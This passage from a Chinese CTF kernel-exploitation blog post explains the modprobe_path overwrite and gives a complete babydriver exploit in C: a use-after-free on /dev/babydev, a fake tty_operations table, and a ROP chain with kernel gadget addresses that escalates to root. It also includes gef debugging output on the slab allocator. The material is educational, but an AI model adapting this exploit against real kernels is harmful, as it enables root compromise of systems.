<p>因此，如果能利用漏洞将<code>modprobe_path</code>的值改成我们的攻击脚本，就能实现以root权限执行任意命令的效果。</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=6dFmH_JEF4s" >这个视频</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 中提到了利用modprobe_path的一般方法：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">system(<span class="string">&quot;echo -ne &#x27;#!/bin/sh\n/bin/chmod 777 /flag&#x27; &gt; /tmp/x&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;chmod +x /tmp/x&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;echo -ne &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /tmp/dummy&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;chmod +x /tmp/dummy&quot;</span>);</span><br><span class="line"><span class="comment">// 然后，利用漏洞将modprobe_path改为/tmp/x</span></span><br><span class="line"><span class="comment">// 最后，执行/tmp/dummy，内核将调起/tmp/x，把flag的廯设置为777</span></span><br></pre></td></tr></table></div></figure>

        <h2 id="babydriver利用示例-5"   >
          <a href="#babydriver利用示例-5" class="heading-link"><i class="fas fa-link"></i></a><a href="#babydriver利用示例-5" class="headerlink" title="babydriver利用示例"></a>babydriver利用示例</h2>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// test.c</span></span><br><span class="line"><span class="comment">// gcc test.c -static -masm=intel  -o test</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_flag</span><span class="params">()</span></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;echo -ne &#x27;#!/bin/sh\n/bin/chmod 777 /flag.txt&#x27; &gt; /tmp/x&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/x&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo -ne &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /tmp/dummy&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/dummy&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/tmp/dummy&quot;</span>);</span><br><span class="line">    sleep(<span class="number">0.3</span>);</span><br><span class="line">    system(<span class="string">&quot;cat /flag.txt&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_rflags, user_sp, user_ss;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> mov_rsp_rax = <span class="number">0xffffffff818855cf</span>;    <span class="comment">// mov rsp, rax ; dec ebx ; jmp 0xffffffff8188558b</span></span><br><span class="line">    <span class="keyword">size_t</span> pop_rax = <span class="number">0xffffffff8101c216</span>;        <span class="comment">// pop rax; ret; </span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">size_t</span> rop_chain[<span class="number">30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">    rop_chain[index++] = <span class="number">0xffffffff8101c216</span>;        <span class="comment">// pop rax; ret;</span></span><br><span class="line">    rop_chain[index++] = <span class="number">0x782f706d742f</span>;            <span class="comment">// /tmp/x</span></span><br><span class="line">    rop_chain[index++] = <span class="number">0xffffffff810048c2</span>;        <span class="comment">// pop rbx ; ret</span></span><br><span class="line">    rop_chain[index++] = <span class="number">0xffffffff81b78680</span>;        <span class="comment">// &amp;modprobe_path</span></span><br><span class="line">    rop_chain[index++] = <span class="number">0xffffffff810e0215</span>;        <span class="comment">// mov qword ptr [rbx], rax ; pop rbx ; pop rbp ; ret;</span></span><br><span class="line">    rop_chain[index++] = <span class="number">0x0</span>;</span><br><span class="line">    rop_chain[index++] = <span class="number">0x0</span>;</span><br><span class="line">    rop_chain[index++] = <span class="number">0xffffffff81885588</span>;        <span class="comment">// swapgs; ret </span></span><br><span class="line">    rop_chain[index++] = <span class="number">0xffffffff81884177</span>;        <span class="comment">// iretq; </span></span><br><span class="line">    rop_chain[index++] = (<span class="keyword">size_t</span>)get_flag;</span><br><span class="line">    rop_chain[index++] = user_cs;</span><br><span class="line">    rop_chain[index++] = user_rflags;</span><br><span class="line">    rop_chain[index++] = user_sp;</span><br><span class="line">    rop_chain[index++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> tty_operations_fake[<span class="number">30</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">30</span>;j++)&#123;</span><br><span class="line">        tty_operations_fake[j]=mov_rsp_rax;   </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">int</span> fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    ioctl(fd1,<span class="number">0x10001</span>,<span class="number">0x2e0</span>);</span><br><span class="line">    close(fd1);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd_tty = open(<span class="string">&quot;dev/ptmx&quot;</span>,O_RDWR | O_NOCTTY);</span><br><span class="line">    <span class="keyword">if</span>(fd_tty &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] cannot open /dev/ptmx\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] ptmx errorno: %d\n&quot;</span>,errno);</span><br><span class="line">        <span class="keyword">goto</span> <span class="built_in">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> tty_struct_leak[<span class="number">4</span>];</span><br><span class="line">    read(fd2,tty_struct_leak,<span class="number">32</span>);</span><br><span class="line">    </span><br><span class="line">    tty_operations_fake[<span class="number">0</span>] = pop_rax;</span><br><span class="line">    tty_operations_fake[<span class="number">1</span>] = (<span class="keyword">size_t</span>)rop_chain;</span><br><span class="line">    tty_operations_fake[<span class="number">2</span>] = mov_rsp_rax;</span><br><span class="line"></span><br><span class="line">    tty_struct_leak[<span class="number">3</span>] = (<span class="keyword">size_t</span>)tty_operations_fake;</span><br><span class="line">    write(fd2,tty_struct_leak,<span class="number">32</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> a[<span class="number">4</span>] = &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line">    write(fd_tty,a,<span class="number">32</span>);</span><br><span class="line">    <span class="comment">// ioctl(fd_tty,0x100,32);</span></span><br><span class="line"><span class="built_in">exit</span>:</span><br><span class="line">    close(fd2);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>



        <h1 id="自问自答"   >
          <a href="#自问自答" class="heading-link"><i class="fas fa-link"></i></a><a href="#自问自答" class="headerlink" title="自问自答"></a>自问自答</h1>
      
        <h2 id="如何找到下一个kmalloc将被分配的堆块地址？"   >
          <a href="#如何找到下一个kmalloc将被分配的堆块地址？" class="heading-link"><i class="fas fa-link"></i></a><a href="#如何找到下一个kmalloc将被分配的堆块地址？" class="headerlink" title="如何找到下一个kmalloc将被分配的堆块地址？"></a>如何找到下一个kmalloc将被分配的堆块地址？</h2>
      <ol>
<li><p>先找到<code>kmem_cache *kmalloc_caches[14]</code>这个全局变量。它里面存储着不同堆大小（0x8~0x2000）对应的管理结构。</p>
<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">gef➤  p &amp;kmalloc_caches</span><br><span class="line">$1 &#x3D; (struct kmem_cache *(*)[14]) 0xffffffff81e21700 &lt;kmalloc_caches&gt;</span><br><span class="line">gef➤  x&#x2F;20gx 0xFFFFFFFF81E21700</span><br><span class="line">0xffffffff81e21700 &lt;kmalloc_caches&gt;:	0x0000000000000000	0xffff880002c01a00(0x60)</span><br><span class="line">0xffffffff81e21710 &lt;kmalloc_caches+16&gt;:	0xffff880002c01800(0xc0)	0xffff880002c01e00(0x8)</span><br><span class="line">0xffffffff81e21720 &lt;kmalloc_caches+32&gt;:	0xffff880002c01d00(0x10)	0xffff880002c01c00(0x20)</span><br><span class="line">0xffffffff81e21730 &lt;kmalloc_caches+48&gt;:	0xffff880002c01b00(0x40)	0xffff880002c01900(0x80)</span><br><span class="line">0xffffffff81e21740 &lt;kmalloc_caches+64&gt;:	0xffff880002c01700(0x100)	0xffff880002c01600(0x200)</span><br><span class="line">0xffffffff81e21750 &lt;kmalloc_caches+80&gt;:	0xffff880002c01500(0x400)	0xffff880002c01400(0x800)</span><br><span class="line">0xffffffff81e21760 &lt;kmalloc_caches+96&gt;:	0xffff880002c01300(0x1000)	0xffff880002c01200(0x2000)</span><br><span class="line">0xffffffff81e21770 &lt;kmem_cache&gt;:	0xffff880002c01000	0x0000000000000004</span><br><span class="line">0xffffffff81e21780 &lt;sysctl_compact_memory&gt;:	0x0000000000000000	0xffff8800026e6000</span><br><span class="line">0xffffffff81e21790 &lt;high_memory&gt;:	0xffff880003fe0000	0x0000000000000000</span><br></pre></td></tr></table></div></figure>

</li>
<li><p>以0x400（kmalloc-1024）大小的堆为例，查看其管理结构，找到<code>struct kmem_cache_cpu __percpu *cpu_slab</code> 和 <code>struct kmem_cache_node *node[MAX_NUMNODES]</code>两个对象。</p>
<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">gef➤  p (struct kmem_cache)*0xffff880002c01500</span><br><span class="line">$2 &#x3D; &#123;</span><br><span class="line">  cpu_slab &#x3D; 0x18380, </span><br><span class="line">  flags &#x3D; 0x40000000, </span><br><span class="line">  min_partial &#x3D; 0x5, </span><br><span class="line">  size &#x3D; 0x400, </span><br><span class="line">  object_size &#x3D; 0x400, </span><br><span class="line">  offset &#x3D; 0x0, </span><br><span class="line">  cpu_partial &#x3D; 0x6, </span><br><span class="line">  oo &#x3D; &#123;</span><br><span class="line">    x &#x3D; 0x10008</span><br><span class="line">  &#125;, </span><br><span class="line">  max &#x3D; &#123;</span><br><span class="line">    x &#x3D; 0x10008</span><br><span class="line">  &#125;, </span><br><span class="line">  min &#x3D; &#123;</span><br><span class="line">    x &#x3D; 0x4</span><br><span class="line">  &#125;, </span><br><span class="line">  allocflags &#x3D; 0x4000, </span><br><span class="line">  refcount &#x3D; 0x4, </span><br><span class="line">  ctor &#x3D; 0x0 &lt;irq_stack_union&gt;, </span><br><span class="line">  inuse &#x3D; 0x400, </span><br><span class="line">  align &#x3D; 0x8, </span><br><span class="line">  reserved &#x3D; 0x0, </span><br><span class="line">  name &#x3D; 0xffffffff81a4c696 &quot;kmalloc-1024&quot;, </span><br><span class="line">  list &#x3D; &#123;</span><br><span class="line">    next &#x3D; 0xffff880002c01668, </span><br><span class="line">    prev &#x3D; 0xffff880002c01468</span><br><span class="line">  &#125;, </span><br><span class="line">  kobj &#x3D; &#123;</span><br><span class="line">    name &#x3D; 0xffff880000a4a190 &quot;:t-0001024&quot;, </span><br><span class="line">    entry &#x3D; &#123;</span><br><span class="line">      next &#x3D; 0xffff880002c01680, </span><br><span class="line">      prev &#x3D; 0xffff880002c01480</span><br><span class="line">    &#125;, </span><br><span class="line">    parent &#x3D; 0xffff880000079558, </span><br><span class="line">    kset &#x3D; 0xffff880000079540, </span><br><span class="line">    ktype &#x3D; 0xffffffff81b90660 &lt;slab_ktype&gt;, </span><br><span class="line">    sd &#x3D; 0xffff8800027103c0, </span><br><span class="line">    kref &#x3D; &#123;</span><br><span class="line">      refcount &#x3D; &#123;</span><br><span class="line">        counter &#x3D; 0x1</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, </span><br><span class="line">    state_initialized &#x3D; 0x1, </span><br><span class="line">    state_in_sysfs &#x3D; 0x1, </span><br><span class="line">    state_add_uevent_sent &#x3D; 0x1, </span><br><span class="line">    state_remove_uevent_sent &#x3D; 0x0, </span><br><span class="line">    uevent_suppress &#x3D; 0x0</span><br><span class="line">  &#125;, </span><br><span class="line">  remote_node_defrag_ratio &#x3D; 0x3e8, </span><br><span class="line">  node &#x3D; &#123;0xffff880002c00d80&#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></div></figure>

</li>
<li><p>解析<code>kmem_cache_node</code>结构体，发现其中的双向链表都为空，说明没有链接slab，应该不会从这里分配。</p>
<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">gef➤  p (struct kmem_cache_node)*0xffff880002c00d80</span><br><span class="line">$5 &#x3D; &#123;</span><br><span class="line">  list_lock &#x3D; &#123;</span><br><span class="line">    &#123;</span><br><span class="line">      rlock &#x3D; &#123;</span><br><span class="line">        raw_lock &#x3D; &#123;</span><br><span class="line">          val &#x3D; &#123;</span><br><span class="line">            counter &#x3D; 0x0</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;, </span><br><span class="line">  nr_partial &#x3D; 0x0, </span><br><span class="line">  partial &#x3D; &#123;</span><br><span class="line">    next &#x3D; 0xffff880002c00d90, </span><br><span class="line">    prev &#x3D; 0xffff880002c00d90</span><br><span class="line">  &#125;, </span><br><span class="line">  nr_slabs &#x3D; &#123;</span><br><span class="line">    counter &#x3D; 0x23</span><br><span class="line">  &#125;, </span><br><span class="line">  total_objects &#x3D; &#123;</span><br><span class="line">    counter &#x3D; 0x118</span><br><span class="line">  &#125;, </span><br><span class="line">  full &#x3D; &#123;</span><br><span class="line">    next &#x3D; 0xffff880002c00db0, </span><br><span class="line">    prev &#x3D; 0xffff880002c00db0</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

</li>
<li><p>再查看<code>kmem_cache_cpu </code>结构体，可以看到freelist指向<code>0xffff880000aff400</code>。此时，当我们在内核中<code>kmalloc(0x400)</code>时，就会把<code>0xffff880000aff400</code>这个堆块分配给我们使用，并更新freelist指向<code>0xffff880000aff800</code>。</p>
<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gef➤  p&#x2F;x __per_cpu_offset[0]</span><br><span class="line">$6 &#x3D; 0xffff880003800000</span><br><span class="line">gef➤  p (struct kmem_cache_cpu)*(0xffff880003800000+0x18380)</span><br><span class="line">$8 &#x3D; &#123;</span><br><span class="line">  freelist &#x3D; 0xffff880000aff400, </span><br><span class="line">  tid &#x3D; 0x2dd, </span><br><span class="line">  page &#x3D; 0xffffea000002bf80, </span><br><span class="line">  partial &#x3D; 0x0 &lt;irq_stack_union&gt;</span><br><span class="line">gef➤ x&#x2F;4gx 0xffff880000aff400</span><br><span class="line">0xffff880000aff400:  0xffff880000aff800  0x0000000000000000</span><br><span class="line">0xffff880000aff410:  0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></div></figure>


</li>
</ol>
<p>注意：不同大小的堆块，在内核中管理形式稍稍不一样。更细致的总结需要等我研究完linux内核slub机制之后再写了。</p>

        <h1 id="参考"   >
          <a href="#参考" class="heading-link"><i class="fas fa-link"></i></a><a href="#参考" class="headerlink" title="参考"></a>参考</h1>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/panhewu9919/article/details/118112795" >kernel exploit 有用的结构体-bsauce</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/bme314/article/details/120324588" >kernel exploit 有用的结构体-inquisiter</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">本文作者: </span><span class="copyright-author__value"><a href="http://blingblingxuanxuan.github.io">blingbling</a></span></div><div class="copyright-link"><span class="copyright-link__name">本文链接: </span><span class="copyright-link__value"><a href="http://blingblingxuanxuan.github.io/2023/01/10/23-01-10-kernel-pwn-useful-struct/">http://blingblingxuanxuan.github.io/2023/01/10/23-01-10-kernel-pwn-useful-struct/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">版权声明: </span><span class="copyright-notice__value">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> 许可协议。转载请注明出处！</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://blingblingxuanxuan.github.io/tags/kernel-pwn/">kernel pwn</a></span></div><div class="post-share"><div class="social-share" data-sites="qzone, qq, weibo, wechat, douban, linkedin, facebook, twitter, google">Share to: </div></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2023/02/04/230204-xhlj2022-messageboard/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">西湖论剑2022-PWN-MessageBoard</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2022/12/25/22-12-15-ways-to-debug-linuxkernel/"><span class="paginator-prev__text">两种方法调试linux kernel</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87"><span class="toc-number">1.</span> <span class="toc-text">
          环境准备</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#cred"><span class="toc-number">2.</span> <span class="toc-text">
          cred</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%83%BD%E5%8A%9B"><span class="toc-number">2.1.</span> <span class="toc-text">
          利用能力</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babydriver%E5%88%A9%E7%94%A8%E7%A4%BA%E4%BE%8B"><span class="toc-number">2.2.</span> <span class="toc-text">
          babydriver利用示例</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#tty-struct"><span class="toc-number">3.</span> <span class="toc-text">
          tty_struct</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%83%BD%E5%8A%9B-1"><span class="toc-number">3.1.</span> <span class="toc-text">
          利用能力</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8E%A7%E5%88%B6%E6%B5%81%E5%8A%AB%E6%8C%81"><span class="toc-number">3.1.1.</span> <span class="toc-text">
          控制流劫持</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">3.1.2.</span> <span class="toc-text">
          信息泄露</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babydriver%E5%88%A9%E7%94%A8%E7%A4%BA%E4%BE%8B-1"><span class="toc-number">3.2.</span> <span class="toc-text">
          babydriver利用示例</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%81%87%E5%88%B0%E4%B8%80%E4%B8%AA%E9%97%AE%E9%A2%98"><span class="toc-number">3.3.</span> <span class="toc-text">
          遇到一个问题</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#seq-operations"><span class="toc-number">4.</span> <span class="toc-text">
          seq_operations</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%83%BD%E5%8A%9B-2"><span class="toc-number">4.1.</span> <span class="toc-text">
          利用能力</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8E%A7%E5%88%B6%E6%B5%81%E5%8A%AB%E6%8C%81-1"><span class="toc-number">4.1.1.</span> <span class="toc-text">
          控制流劫持</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-1"><span class="toc-number">4.1.2.</span> <span class="toc-text">
          信息泄露</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babydriver%E5%88%A9%E7%94%A8%E7%A4%BA%E4%BE%8B-2"><span class="toc-number">4.2.</span> <span class="toc-text">
          babydriver利用示例</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#subprocess-info"><span class="toc-number">5.</span> <span class="toc-text">
          subprocess_info</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%83%BD%E5%8A%9B-3"><span class="toc-number">5.1.</span> <span class="toc-text">
          利用能力</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8E%A7%E5%88%B6%E6%B5%81%E5%8A%AB%E6%8C%81-2"><span class="toc-number">5.1.1.</span> <span class="toc-text">
          控制流劫持</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-2"><span class="toc-number">5.1.2.</span> <span class="toc-text">
          信息泄露</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babydriver%E5%88%A9%E7%94%A8%E7%A4%BA%E4%BE%8B-3"><span class="toc-number">5.2.</span> <span class="toc-text">
          babydriver利用示例</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pipe-buffer"><span class="toc-number">6.</span> <span class="toc-text">
          pipe_buffer</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%83%BD%E5%8A%9B-4"><span class="toc-number">6.1.</span> <span class="toc-text">
          利用能力</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8E%A7%E5%88%B6%E6%B5%81%E5%8A%AB%E6%8C%81-3"><span class="toc-number">6.1.1.</span> <span class="toc-text">
          控制流劫持</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-3"><span class="toc-number">6.1.2.</span> <span class="toc-text">
          信息泄露</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babydriver%E5%88%A9%E7%94%A8%E7%A4%BA%E4%BE%8B-4"><span class="toc-number">6.2.</span> <span class="toc-text">
          babydriver利用示例</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#shm-file-data%E4%BB%8B%E7%BB%8D"><span class="toc-number">7.</span> <span class="toc-text">
          shm_file_data介绍</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#msg-msg%E4%BB%8B%E7%BB%8D"><span class="toc-number">8.</span> <span class="toc-text">
